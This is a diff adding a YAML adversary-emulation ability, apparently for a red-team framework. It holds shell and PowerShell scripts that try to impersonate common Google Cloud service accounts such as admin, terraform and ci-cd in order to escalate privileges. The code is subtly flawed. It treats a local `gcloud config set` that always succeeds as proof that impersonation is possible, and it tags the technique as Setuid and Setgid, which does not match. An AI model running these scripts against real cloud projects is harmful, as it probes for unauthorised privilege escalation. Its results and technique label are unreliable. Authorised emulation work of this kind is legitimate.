@@ -1,0 +1,90 @@
+---
+- id: gcp-priv-001
+  name: Impersonate Service Accounts
+  description: Attempt to impersonate higher-privileged service accounts
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.001
+    name: Setuid and Setgid
+  platforms:
+    darwin:
+      sh:
+        command: |
+          if command -v gcloud >/dev/null 2>&1; then
+            echo "[+] Attempting service account impersonation:"
+            PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
+            if [ ! -z "$PROJECT_ID" ]; then
+              echo "[+] Current project: $PROJECT_ID"
+              echo "[+] Testing common service account names:"
+              COMMON_SA="compute default admin terraform github-actions ci-cd deployment"
+              for sa in $COMMON_SA; do
+                echo "[+] Testing: $sa@$PROJECT_ID.iam.gserviceaccount.com"
+                gcloud config set auth/impersonate_service_account "$sa@$PROJECT_ID.iam.gserviceaccount.com" 2>/dev/null
+                if [ $? -eq 0 ]; then
+                  echo "  [+] SUCCESS: Can impersonate $sa service account"
+                  gcloud auth list 2>/dev/null
+                  gcloud config unset auth/impersonate_service_account 2>/dev/null
+                else
+                  echo "  [-] FAILED: Cannot impersonate $sa service account"
+                fi
+              done
+            else
+              echo "[-] Cannot determine project ID"
+            fi
+          else
+            echo "[-] gcloud CLI not available"
+          fi
+    linux:
+      sh:
+        command: |
+          if command -v gcloud >/dev/null 2>&1; then
+            echo "[+] Attempting service account impersonation:"
+            PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
+            if [ ! -z "$PROJECT_ID" ]; then
+              echo "[+] Current project: $PROJECT_ID"
+              echo "[+] Testing common service account names:"
+              COMMON_SA="compute default admin terraform github-actions ci-cd deployment"
+              for sa in $COMMON_SA; do
+                echo "[+] Testing: $sa@$PROJECT_ID.iam.gserviceaccount.com"
+                gcloud config set auth/impersonate_service_account "$sa@$PROJECT_ID.iam.gserviceaccount.com" 2>/dev/null
+                if [ $? -eq 0 ]; then
+                  echo "  [+] SUCCESS: Can impersonate $sa service account"
+                  gcloud auth list 2>/dev/null
+                  gcloud config unset auth/impersonate_service_account 2>/dev/null
+                else
+                  echo "  [-] FAILED: Cannot impersonate $sa service account"
+                fi
+              done
+            else
+              echo "[-] Cannot determine project ID"
+            fi
+          else
+            echo "[-] gcloud CLI not available"
+          fi
+    windows:
+      psh,pwsh:
+        command: |
+          try {
+            Write-Host "[+] Attempting service account impersonation:"
+            $projectId = gcloud config get-value project 2>$null
+            if ($projectId) {
+              Write-Host "[+] Current project: $projectId"
+              $commonSA = @("compute", "default", "admin", "terraform", "github-actions", "ci-cd", "deployment")
+              foreach ($sa in $commonSA) {
+                $saEmail = "$sa@$projectId.iam.gserviceaccount.com"
+                Write-Host "[+] Testing: $saEmail"
+                gcloud config set auth/impersonate_service_account $saEmail 2>$null
+                if ($LASTEXITCODE -eq 0) {
+                  Write-Host "  [+] SUCCESS: Can impersonate $sa service account"
+                  gcloud auth list 2>$null
+                  gcloud config unset auth/impersonate_service_account 2>$null
+                } else {
+                  Write-Host "  [-] FAILED: Cannot impersonate $sa service account"
+                }
+              }
+            } else {
+              Write-Host "[-] Cannot determine project ID"  
+            }
+          } catch {
+            Write-Host "[-] Error testing service account impersonation"
+          }
